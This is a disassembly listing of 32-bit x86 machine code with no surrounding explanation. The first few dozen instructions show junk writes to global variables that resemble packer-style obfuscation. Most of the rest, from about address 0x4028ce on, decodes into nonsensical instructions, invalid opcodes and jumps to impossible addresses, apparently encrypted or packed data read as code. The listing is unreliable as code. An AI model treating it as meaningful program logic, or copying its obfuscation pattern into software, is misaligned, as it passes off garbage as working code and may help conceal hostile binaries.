  4027d3:	xor    ecx,ebx
  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   esi,DWORD PTR [eax],0x7a8c2fba
  4028df:	jp     0x40295b
  4028e1:	jp     0x4028ed
  4028e3:	pop    edi
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x34652f1b
  4028f0:	imul   esp,DWORD PTR [esi+0x7a],0x6d6a6a7e
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x342f8bf
  40298a:	retf   0x808e
  40298d:	xchg   ebp,eax
  40298e:	xlat   BYTE PTR ds:[ebx]
  40298f:	push   ebx
  402990:	mov    ch,0x27
  402992:	lock mov ds:0x95715d45,al
  402998:	pop    ecx
  402999:	pop    esp
  40299a:	call   0xa3562d97
  40299f:	mov    WORD PTR [edx+0x55be46b7],cs
  4029a5:	adc    eax,0xfc5629af
  4029aa:	int    0x60
  4029ac:	lods   al,BYTE PTR ds:[esi]
  4029ad:	or     DWORD PTR [edi+0x21],ebx
  4029b0:	push   edx
  4029b1:	mov    ds:0xb2884bdd,al
  4029b6:	cmp    eax,0x8e474bb8
  4029bb:	test   al,0x39
  4029bd:	adc    DWORD PTR [eax-0x27ff2fea],0xc9287e22
  4029c7:	popa   
  4029c8:	sbb    esp,esp
  4029ca:	cmp    BYTE PTR [eax+0x3e],al
  4029cd:	(bad)
  4029d0:	rcr    edx,cl
  4029d2:	dec    ebx
  4029d3:	ret    
  4029d4:	pop    edx
  4029d5:	cmp    eax,0x9e6801f5
  4029da:	inc    esp
  4029db:	dec    esi
  4029dc:	sbb    eax,DWORD PTR [eax-0x4ba74372]
  4029e2:	into   
  4029e3:	pop    es
  4029e4:	mov    ebx,0x9c313017
  4029e9:	inc    eax
  4029ea:	jo     0x4029cf
  4029ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029ed:	pop    eax
  4029ee:	push   es
  4029ef:	pop    ebp
  4029f0:	push   0xd
  4029f2:	or     al,0x60
  4029f4:	and    BYTE PTR [esi-0x39b16967],0xb6
  4029fb:	push   eax
  4029fc:	fwait
  4029fd:	xor    BYTE PTR [eax+0x5616af22],0xfd
  402a04:	xchg   esp,eax
  402a05:	sahf   
  402a06:	imul   edi,esp,0x3614025f
  402a0c:	xor    BYTE PTR ds:0x8838a5b0,0xde
  402a13:	push   ebx
  402a14:	out    dx,eax
  402a15:	sub    ebx,eax
  402a17:	call   0xc2ab:0x1405b801
  402a1e:	and    al,0xd5
  402a20:	popa   
  402a21:	cmp    DWORD PTR [edi-0x41f58420],esp
  402a27:	sub    dl,dh
  402a29:	imul   eax,DWORD PTR [eax],0x5dc17855
  402a2f:	gs add al,0xb7
  402a32:	pushf  
  402a33:	dec    eax
  402a34:	lods   ax,WORD PTR ds:[esi]
  402a36:	sar    ebx,0x9e
  402a39:	xchg   ebx,eax
  402a3a:	popa   
  402a3b:	test   eax,0xcd544f7f
  402a40:	int    0xb3
  402a42:	in     al,dx
  402a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a44:	inc    esi
  402a45:	cdq    
  402a46:	ss mov edx,0x49fb066b
  402a4c:	in     al,0x3a
  402a4e:	rcr    BYTE PTR [edi+0x1],1
  402a51:	into   
  402a52:	push   0xdb28a4f1
  402a57:	imul   esi,DWORD PTR [edi],0xfffffff2
  402a5a:	dec    esi
  402a5b:	jne    0x402ac2
  402a5d:	jbe    0x402a81
  402a5f:	mov    esp,0x42ca7d2a
  402a64:	fs sti 
  402a66:	push   es
  402a67:	jnp    0x402aaf
  402a69:	sbb    al,BYTE PTR [edx+0x5c654b22]
  402a6f:	add    al,0x60
  402a71:	or     cl,0xcb
  402a74:	or     ebx,DWORD PTR [ebp+0x64]
  402a77:	jns    0x402ac6
  402a79:	ret    0x80e3
  402a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a7d:	xchg   ebx,eax
  402a7e:	int    0xbd
  402a80:	pop    esi
  402a81:	ins    BYTE PTR es:[edi],dx
  402a82:	pushf  
  402a83:	pop    ss
  402a84:	inc    esp
  402a85:	call   0x51c19843
  402a8a:	inc    esp
  402a8b:	out    0x93,al
  402a8d:	enter  0x4e43,0x9a
  402a91:	ins    BYTE PTR es:[edi],dx
  402a92:	xchg   edi,eax
  402a93:	mov    bl,0x92
  402a95:	adc    edx,DWORD PTR [ecx+0x59]
  402a98:	cmp    ch,BYTE PTR [ebp+esi*2+0x18bcd30]
  402a9f:	popa   
  402aa0:	fpatan 
  402aa2:	adc    dh,BYTE PTR [ecx-0x50f19652]
  402aa8:	and    DWORD PTR [ebx],esi
  402aaa:	shrd   DWORD PTR [edx+0x51ba188a],ebp,0xdb
  402ab2:	lahf   
  402ab3:	add    BYTE PTR [edi-0x2f0c7383],0xa
  402aba:	xor    DWORD PTR [eax+0x4a523a12],ebx
  402ac0:	ret    
  402ac1:	in     eax,dx
  402ac2:	mov    edx,0xef3f1e51
  402ac7:	cmc    
  402ac8:	inc    ecx
  402ac9:	jne    0x402adc
  402acb:	imul   ebp,eax,0x4fbc50bd
  402ad1:	in     eax,0x4e
  402ad3:	nop
  402ad4:	xchg   BYTE PTR [eax-0x3d156a60],dh
  402ada:	push   ebp
  402adb:	dec    esi
  402adc:	mov    bh,0xd1
  402ade:	push   esi
  402adf:	shr    BYTE PTR [ebx-0x10],1
  402ae2:	pop    es
  402ae3:	push   esi
  402ae4:	mov    al,BYTE PTR [ebx]
  402ae6:	mov    ds:0xfc28a8b5,al
  402aeb:	sub    eax,0x49134fc1
  402af0:	pop    esp
  402af1:	cmp    eax,0xc3d4d533
  402af6:	or     al,BYTE PTR [eax-0x6]
  402af9:	addr16 enter 0xf331,0xf8
  402afe:	and    si,WORD PTR [esi]
  402b01:	repnz retf 0xac8e
  402b05:	and    eax,esi
  402b07:	stc    
  402b08:	mov    es,WORD PTR [esi-0x18]
  402b0b:	fabs   
  402b0d:	ds xor ch,bl
  402b10:	push   ebx
  402b11:	dec    esi
  402b12:	inc    ebp
  402b13:	xor    BYTE PTR [eax],dl
  402b15:	add    al,0x53
  402b17:	push   ecx
  402b18:	int    0xe5
  402b1a:	push   eax
  402b1b:	lea    edx,[edi-0x6dd79015]
  402b21:	dec    esp
  402b22:	and    esp,ebp
  402b24:	pop    ss
  402b25:	pop    edi
  402b26:	and    DWORD PTR ds:0x272a91d2,eax
  402b2c:	jne    0x402ab7
  402b2e:	inc    ebx
  402b2f:	inc    esp
  402b30:	mov    al,ds:0x1993fdda
  402b35:	inc    ecx
  402b36:	dec    eax
  402b37:	inc    ebx
  402b38:	daa    
  402b39:	cdq    
  402b3a:	sahf   
  402b3b:	adc    esi,ebp
  402b3d:	pop    ebp
  402b3e:	ret    
  402b3f:	jg     0x402b98
  402b41:	inc    edx
  402b42:	and    BYTE PTR [ebx+0x37d5cee],ch
  402b48:	rcr    DWORD PTR [edi],0x21
  402b4b:	std    
  402b4c:	or     bh,BYTE PTR [ecx+esi*2]
  402b4f:	push   cs
  402b50:	ficomp WORD PTR [edx+0x55]
  402b53:	mov    ebp,0xdb524583
  402b58:	mov    esp,0x62db8103
  402b5d:	int3   
  402b5e:	nop
  402b5f:	push   ebx
  402b60:	fcmovbe st,st(3)
  402b62:	div    DWORD PTR [ecx-0x1a]
  402b65:	add    eax,0x5c2f2169
  402b6a:	xor    eax,0x16a7bf28
  402b6f:	stos   BYTE PTR es:[edi],al
  402b70:	int3   
  402b71:	(bad)  
  402b72:	fdiv   DWORD PTR [ebx-0x79]
  402b75:	fs test eax,0xbe191937
  402b7b:	sub    BYTE PTR [ebp-0x3f],0x9f
  402b7f:	and    DWORD PTR [edx-0x45],eax
  402b82:	xor    edx,0x44
  402b85:	pop    es
  402b86:	out    dx,eax
  402b87:	cmc    
  402b88:	out    dx,eax
  402b89:	mov    ah,0xd9
  402b8b:	dec    esp
  402b8c:	inc    edx
  402b8d:	int    0xc8
  402b8f:	push   eax
  402b90:	jnp    0x402bc1
  402b92:	inc    esi
  402b93:	inc    edi
  402b94:	(bad)  
  402b95:	bound  ecx,QWORD PTR [ecx-0x49a5164e]
  402b9b:	inc    esp
  402b9c:	fs mov bl,0x58
  402b9f:	xchg   edi,eax
  402ba0:	cmp    DWORD PTR [edi+0x56],ecx
  402ba3:	mov    al,ds:0x8e935757
  402ba8:	cmp    cl,dh
  402baa:	push   ds
  402bab:	fsubp  st(7),st
  402bad:	int3   
  402bae:	fst    DWORD PTR [edi]
  402bb0:	xor    al,0xb5
  402bb2:	push   esi
  402bb3:	hlt    
  402bb4:	popf   
  402bb5:	mov    bl,0xfe
  402bb7:	mov    bh,0x4d
  402bb9:	inc    edx
  402bba:	mov    ch,0x2c
  402bbc:	fisttp WORD PTR [edi+0x1]
  402bbf:	rcr    cl,1
  402bc1:	sbb    eax,0xe88438df
  402bc7:	sub    esp,ebx
  402bc9:	test   al,0x81
  402bcb:	dec    edi
  402bcc:	nop
  402bcd:	cli    
  402bce:	mov    ah,0x68
  402bd0:	dec    edx
  402bd1:	jle    0x402c0e
  402bd3:	imul   ebx,DWORD PTR [esi],0x13
  402bd6:	les    eax,FWORD PTR [ebx]
  402bd8:	push   es
  402bd9:	jae    0x402c35
  402bdb:	and    esp,DWORD PTR ds:0x5db95fb5
  402be1:	push   0x4
  402be3:	mov    edx,0xe43e434a
  402be8:	and    al,0xa6
  402bea:	lds    ebp,FWORD PTR [edx]
  402bec:	es (bad) 
  402bee:	cmp    al,0x1b
  402bf0:	xor    DWORD PTR [ebx+0x12],eax
  402bf3:	outs   dx,DWORD PTR ds:[esi]
  402bf4:	jge    0x402b7c
  402bf6:	push   ss
  402bf7:	jno    0x402bf6
  402bf9:	cwde   
  402bfa:	mov    bl,0x8b
  402bfc:	loop   0x402c01
  402bfe:	and    al,0xa4
  402c00:	lock cdq 
  402c02:	jb     0x402be0
  402c04:	dec    ecx
  402c05:	aam    0x2
  402c07:	push   edx
  402c08:	repz mov ds:0xf2a5b3da,eax
  402c0e:	int    0x66
  402c10:	rcl    BYTE PTR [edi-0x2f],1
  402c13:	das    
  402c14:	adc    DWORD PTR [esi+ecx*4-0x60a8439d],esp
  402c1b:	pop    edi
  402c1c:	and    esi,DWORD PTR [edx+0x48d922d0]
  402c22:	fwait
  402c23:	lahf   
  402c24:	cmp    al,0x99
  402c26:	jnp    0x402c3f
  402c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c29:	dec    edi
  402c2a:	add    ebx,ebx
  402c2c:	add    eax,0x7818cc89
  402c31:	fwait
  402c32:	arpl   WORD PTR [eax+0x68017c65],dx
  402c38:	cmp    al,BYTE PTR [edi-0x8f4298b]
  402c3e:	mov    ds:0xf559984f,eax
  402c43:	cmpxchg DWORD PTR [edx+ebx*2],edx
  402c47:	outs   dx,BYTE PTR ds:[esi]
  402c48:	je     0x402be5
  402c4a:	pop    esp
  402c4b:	pop    ecx
  402c4c:	jae    0x402c8a
  402c4e:	aaa    
  402c4f:	jb     0x402c8a
  402c51:	jo     0x402bd8
  402c53:	(bad)  
  402c54:	xchg   ebp,eax
  402c55:	mov    ah,0xbe
  402c57:	daa    
  402c58:	jnp    0x402c9c
  402c5a:	mov    esi,0x229eb3
  402c5f:	outs   dx,BYTE PTR ds:[esi]
  402c60:	sub    esp,esp
  402c62:	icebp  
  402c63:	dec    eax
  402c64:	lock sbb dl,BYTE PTR [ecx]
  402c67:	outs   dx,DWORD PTR ds:[esi]
  402c68:	retf   0x2f2a
  402c6b:	push   0x43253729
  402c70:	dec    ecx
  402c71:	jns    0x402c0d
  402c73:	fsub   st(0),st
  402c75:	cmp    eax,0xd8326e8b
  402c7a:	das    
  402c7b:	rol    DWORD PTR [ecx],0x6f
  402c7e:	xchg   ecx,eax
  402c7f:	cmp    ah,BYTE PTR [edi+0x39d254da]
  402c85:	sbb    cl,BYTE PTR ds:0x4a92713c
  402c8b:	addr16 mov esp,0xd381c15
  402c91:	out    0x56,al
  402c93:	retf   
  402c94:	dec    edi
  402c95:	fist   WORD PTR [ebx]
  402c97:	mov    ebp,0x717a3546
  402c9c:	arpl   WORD PTR [esi-0xb],dx
  402c9f:	xor    cl,BYTE PTR [esi]
  402ca1:	dec    ebx
  402ca2:	dec    BYTE PTR [eax]
  402ca4:	sub    dl,bl
  402ca6:	sub    dh,BYTE PTR [esi+0x1c]
  402ca9:	lahf   
  402caa:	(bad)  
  402cab:	fsubr  st,st(5)
  402cad:	pop    edi
  402cae:	push   0x2f
  402cb0:	mov    dh,0xef
  402cb2:	mov    bl,0xb1
  402cb4:	dec    ecx
  402cb5:	add    eax,0x440f2152
  402cba:	les    ebx,FWORD PTR [edi]
  402cbc:	sub    DWORD PTR [ecx+0x761377a3],edi
  402cc2:	mov    al,ds:0xe39fd216
  402cc7:	in     eax,dx
  402cc8:	out    dx,eax
  402cc9:	xchg   BYTE PTR ds:0xfa95c8af,dh
  402ccf:	js     0x402cbe
  402cd1:	xor    eax,0x3ad34052
  402cd6:	sbb    eax,DWORD PTR ds:0x7ccab578
  402cdc:	cmc    
  402cdd:	sbb    al,0x7a
  402cdf:	jmp    0xbc3b:0xefb114f2
  402ce6:	stc    
  402ce7:	scas   eax,DWORD PTR es:[edi]
  402ce8:	jg     0x402cca
  402cea:	sbb    ebp,esp
  402cec:	loopne 0x402cdd
  402cee:	jo     0x402d4c
  402cf0:	int    0x39
  402cf2:	pop    ebp
  402cf3:	fmul   st(7),st
  402cf5:	test   ch,dh
  402cf7:	lods   al,BYTE PTR ds:[esi]
  402cf8:	mov    ecx,0x8e3d90f1
  402cfd:	push   esi
  402cfe:	clc    
  402cff:	je     0x402d35
  402d01:	mov    ebx,DWORD PTR [esi-0x57]
  402d04:	mov    dl,0x8a
  402d06:	ficomp DWORD PTR [edx]
  402d08:	out    dx,al
  402d09:	pop    es
  402d0a:	add    al,0x2
  402d0c:	sahf   
  402d0d:	ficom  DWORD PTR [edx+esi*2-0x33adedfb]
  402d14:	and    eax,0xce99c916
  402d19:	scas   eax,DWORD PTR es:[edi]
  402d1a:	test   DWORD PTR [ebp+0x62],ecx
  402d1d:	push   ebx
  402d1e:	cmc    
  402d1f:	fsubr  DWORD PTR [ebp+0x58]
  402d22:	shl    eax,0x62
  402d25:	xor    eax,DWORD PTR [ecx]
  402d27:	pop    es
  402d28:	loopne 0x402cf1
  402d2a:	mov    ebx,DWORD PTR [eax]
  402d2c:	cmc    
  402d2d:	mov    esp,0xc32606e7
  402d32:	add    bh,cl
  402d34:	jmp    0xbd75:0xb3af358c
  402d3b:	rcl    BYTE PTR [edi-0xa],cl
  402d3e:	fldenv [ecx-0x2b]
  402d41:	mov    edx,0xb734d2e2
  402d46:	out    dx,al
  402d47:	cs jge 0x402d68
  402d4a:	and    esp,DWORD PTR [ecx]
  402d4c:	push   0x4a0d9d86
  402d51:	push   0xd7dfd4b0
  402d56:	shr    ah,0xb2
  402d59:	stc    
  402d5a:	dec    al
  402d5c:	and    edx,DWORD PTR [edx]
  402d5e:	fidiv  DWORD PTR [esi+0x45]
  402d61:	nop
  402d62:	xor    ecx,DWORD PTR [esi-0x1c]
  402d65:	dec    esi
  402d66:	mov    BYTE PTR [eax],bl
  402d68:	add    eax,0xc60c4619
  402d6d:	sbb    esp,DWORD PTR [ecx+0x59]
  402d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d71:	push   esi
  402d72:	mov    ch,0xc3
  402d74:	jno    0x402d1a
  402d76:	and    al,0x95
  402d78:	cmp    dh,dh
  402d7a:	retf   
  402d7b:	rcl    eax,cl
  402d7d:	mov    bh,0xd3
  402d7f:	stc    
  402d80:	outs   dx,DWORD PTR ds:[esi]
  402d81:	sbb    eax,0x4ee60800
  402d86:	and    eax,0x686fbcc9
  402d8b:	xchg   esi,eax
  402d8c:	jg     0x402da4
  402d8e:	ins    DWORD PTR es:[edi],dx
  402d8f:	adc    al,0x91
  402d91:	xor    ecx,DWORD PTR [eax+0x13f89a8c]
  402d97:	mov    bl,0x3d
  402d99:	adc    al,0xf1
  402d9b:	mov    bh,0xba
  402d9d:	mov    bh,0xa2
  402d9f:	cmp    DWORD PTR [bx+si-0x69d6],ebp
  402da4:	or     dh,BYTE PTR ds:0x90a78596
  402daa:	jmp    0x9bb1:0x23986502
  402db1:	xchg   ebp,eax
  402db2:	sbb    eax,0xbdbb0904
  402db7:	iret   
  402db8:	hlt    
  402db9:	(bad)  
  402dba:	mov    bl,0xd1
  402dbc:	inc    esp
  402dbd:	fild   DWORD PTR [esi-0x30]
  402dc0:	mov    esp,0xe176045a
  402dc5:	inc    edx
  402dc6:	xchg   edx,eax
  402dc7:	pop    ss
  402dc8:	sahf   
  402dc9:	and    eax,DWORD PTR ds:0x106b1534
  402dcf:	je     0x402d72
  402dd1:	shr    BYTE PTR fs:[edx-0x21ce65a],cl
  402dd8:	jmp    0x52bf8aa7
  402ddd:	in     al,dx
  402dde:	ja     0x402dac
  402de0:	adc    al,0x8f
  402de2:	push   ds
  402de3:	call   0x1021:0xeadfc2f4
  402dea:	das    
  402deb:	in     al,dx
  402dec:	out    dx,eax
  402ded:	aas    
  402dee:	test   edi,ebx
  402df0:	loop   0x402e69
  402df2:	or     eax,0xbec45dff
  402df7:	dec    esp
  402df8:	mov    ah,0x69
  402dfa:	jge    0x402e39
  402dfc:	ins    BYTE PTR es:[edi],dx
  402dfd:	icebp  
  402dfe:	adc    esp,DWORD PTR [ebp+0x53354e65]
  402e04:	or     edi,ebp
  402e06:	mov    WORD PTR [edi],es
  402e08:	ss stos DWORD PTR es:[edi],eax
  402e0a:	sub    BYTE PTR [eax],0xc
  402e0d:	jl     0x402e7c
  402e0f:	fdivr  DWORD PTR [edi]
  402e11:	ins    BYTE PTR es:[edi],dx
  402e12:	add    dh,BYTE PTR [edx+0x1f673e]
  402e18:	or     esi,esi
  402e1a:	popf   
  402e1b:	ret    0x4565
  402e1e:	push   cs
  402e1f:	nop
  402e20:	sahf   
  402e21:	lahf   
  402e22:	je     0x402e8a
  402e24:	inc    eax
  402e25:	mov    cl,0x8e
  402e27:	or     BYTE PTR [edi+0x15],0x59
  402e2b:	and    BYTE PTR [ecx],0xe6
  402e2e:	mov    ds:0xeccca036,eax
  402e33:	mov    al,0xd2
  402e35:	mov    al,ds:0xd599b10c
  402e3a:	sbb    esi,ecx
  402e3c:	push   eax
  402e3d:	mov    dl,0xaa
  402e3f:	lock ret 0x4bda
  402e43:	mov    cl,0xf5
  402e45:	and    esp,DWORD PTR [edx]
  402e47:	xor    eax,0x356165ea
  402e4c:	mov    bl,0xc3
  402e4e:	xlat   BYTE PTR ds:[ebx]
  402e4f:	cdq    
  402e50:	(bad)  
  402e51:	mov    ecx,0xc4a87105
  402e56:	not    BYTE PTR [esi+0x53869ad0]
  402e5c:	aaa    
  402e5d:	sub    DWORD PTR ds:0x6bb26e64,esi
  402e63:	mov    ebp,0x4926b3dc
  402e68:	push   es
  402e69:	and    DWORD PTR [ebx+edi*1-0x46],edi
  402e6d:	and    DWORD PTR [esi+0x53],ebp
  402e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e71:	scas   eax,DWORD PTR es:[edi]
  402e72:	mov    ds:0xe08b8ef8,al
  402e77:	ror    BYTE PTR [edi],cl
  402e79:	inc    ecx
  402e7a:	shl    DWORD PTR [edx-0x56],cl
  402e7d:	mov    dh,0x9b
  402e7f:	stos   BYTE PTR es:[edi],al
  402e80:	fsubr  QWORD PTR [ebx]
  402e82:	push   ebx
  402e83:	add    esi,DWORD PTR ds:0x6eea86c8
  402e89:	or     eax,0x69511162
  402e8e:	in     al,0x52
  402e90:	pop    edx
  402e91:	mov    ecx,0x84eca002
  402e96:	fwait
  402e97:	iret   
  402e98:	xchg   ecx,eax
  402e99:	into   
  402e9a:	add    esp,ecx
  402e9c:	call   0x1ddc:0x6ac5e9c7
  402ea3:	and    dl,BYTE PTR [ecx-0x76]
  402ea6:	aaa    
  402ea7:	xchg   BYTE PTR [ecx-0x6d],dh
  402eaa:	aaa    
  402eab:	mov    edi,0xca6e9ce
  402eb0:	sbb    eax,0x58b07fa2
  402eb5:	aaa    
  402eb6:	push   ds
  402eb7:	xlat   BYTE PTR ds:[ebx]
  402eb8:	push   0xd
  402eba:	sbb    eax,0x1c8b1f02
  402ebf:	rol    ch,0x4f
  402ec2:	mov    al,ds:0x5f806586
  402ec7:	mov    ecx,0x958628f7
  402ecc:	or     dl,cl
  402ece:	aad    0x21
  402ed0:	mov    eax,fs:0x32e9e232
  402ed6:	sbb    eax,0x4835e6b2
  402edb:	sbb    DWORD PTR [ecx-0x24],eax
  402ede:	fistp  WORD PTR [esi]
  402ee0:	retf   0x8609
  402ee3:	sub    eax,DWORD PTR [esi]
  402ee5:	or     DWORD PTR [edi-0x3266d432],edx
  402eeb:	clc    
  402eec:	mov    ds:0xc7873955,eax
  402ef1:	aam    0x9f
  402ef3:	dec    edx
  402ef4:	xor    cl,bh
  402ef6:	rol    DWORD PTR [eax-0x7faac73],cl
  402efc:	mov    bl,0x6d
  402efe:	xchg   esp,eax
  402eff:	mov    al,BYTE PTR [edx+0x5b]
  402f02:	outs   dx,BYTE PTR ds:[esi]
  402f03:	mov    dl,0x15
  402f05:	cwde   
  402f06:	imul   ecx,DWORD PTR [edi+0x15],0xc751f5d0
  402f0d:	outs   dx,DWORD PTR ds:[esi]
  402f0e:	(bad)  
  402f0f:	scas   eax,DWORD PTR es:[edi]
  402f10:	jbe    0x402f69
  402f12:	mov    al,0xb2
  402f14:	gs and eax,0x8fc1d4f1
  402f1a:	xchg   esp,eax
  402f1b:	dec    edi
  402f1c:	push   ebx
  402f1d:	dec    esi
  402f1e:	ins    DWORD PTR es:[edi],dx
  402f1f:	data16 cmp BYTE PTR [esi],dl
  402f22:	lahf   
  402f23:	enter  0x15df,0xdd
  402f27:	ja     0x402eb4
  402f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f2a:	xchg   ecx,eax
  402f2b:	dec    edi
  402f2c:	adc    DWORD PTR [eax],eax
  402f2e:	sub    ah,BYTE PTR [eax+0x76]
  402f31:	xor    al,0x2f
  402f33:	cs int 0xf2
  402f36:	fs xchg edi,eax
  402f38:	sbb    esp,0x19967ad
  402f3e:	and    eax,0xa278483e
  402f43:	pop    ebx
  402f44:	das    
  402f45:	dec    edi
  402f46:	inc    edi
  402f47:	dec    ebx
  402f48:	test   DWORD PTR [ebx],ebx
  402f4a:	mov    ch,BYTE PTR [edi+0x23856df0]
  402f50:	and    cl,BYTE PTR [ebx]
  402f52:	cmc    
  402f53:	sbb    BYTE PTR [ebp-0x27934774],ah
  402f59:	or     cl,BYTE PTR [esi+0x6f3e51c]
  402f5f:	hlt    
  402f60:	fdiv   QWORD PTR [edi+0x5e5fcaf]
  402f66:	mov    esi,0x754b9a9
  402f6b:	(bad)  
  402f6c:	dec    esi
  402f6d:	and    cl,BYTE PTR [ecx]
  402f6f:	(bad)  
  402f70:	mov    ecx,0x8299f208
  402f75:	inc    si
  402f77:	jmp    0xba1b:0x56c6abdc
  402f7e:	mov    eax,0xacab24c2
  402f83:	int3   
  402f84:	mov    dh,0x8
  402f86:	nop
  402f87:	and    al,0x40
  402f89:	call   0x6514:0xae7e15d0
  402f90:	push   ebx
  402f91:	xchg   ebx,eax
  402f92:	mov    dh,0xde
  402f94:	ret    
  402f95:	add    BYTE PTR [edi-0x31],dh
  402f98:	fild   QWORD PTR [ebp-0xe]
  402f9b:	push   cs
  402f9c:	inc    ecx
  402f9d:	sbb    BYTE PTR [eax-0x7d],al
  402fa0:	xor    al,0x1c
  402fa2:	sbb    ebp,DWORD PTR [esi]
  402fa4:	sub    esp,DWORD PTR [esi]
  402fa6:	mov    eax,ds:0xb18da44d
  402fab:	jns    0x402fec
  402fad:	mov    dh,0x2e
  402faf:	xchg   ebx,eax
  402fb0:	jg     0x40302f
  402fb2:	sbb    DWORD PTR [ebp-0xa],ebp
  402fb5:	mov    dl,BYTE PTR [ebx+esi*2]
  402fb8:	mov    edx,0x7d5fbfcc
  402fbd:	dec    esp
  402fbe:	aam    0x5b
  402fc0:	leave  
  402fc1:	adc    ecx,esi
  402fc3:	(bad)  
  402fc4:	mov    eax,ds:0xce74f1f8
  402fc9:	test   eax,0x769a4376
  402fce:	std    
  402fcf:	jbe    0x402f6d
  402fd1:	and    BYTE PTR [edi-0x5c454f6a],cl
  402fd7:	push   ebp
  402fd8:	mov    WORD PTR [esi-0x24cc438b],ds
  402fde:	scas   al,BYTE PTR es:[edi]
  402fdf:	inc    esp
  402fe0:	scas   eax,DWORD PTR es:[edi]
  402fe1:	icebp  
  402fe2:	outs   dx,BYTE PTR ds:[esi]
  402fe3:	xchg   BYTE PTR [edi-0x60],bl
  402fe6:	clc    
  402fe7:	jle    0x402fd2
  402fe9:	jmp    0xb642a529
  402fee:	int    0x89
  402ff0:	cld    
  402ff1:	sbb    al,0xdb
  402ff3:	gs arpl sp,ax
  402ff6:	add    ebp,DWORD PTR [ebx-0x58]
  402ff9:	jecxz  0x402fd9
  402ffb:	add    eax,0xc352c70
  403000:	mov    ebp,0xf6ca2248
  403005:	mov    al,0x75
  403007:	xchg   ecx,eax
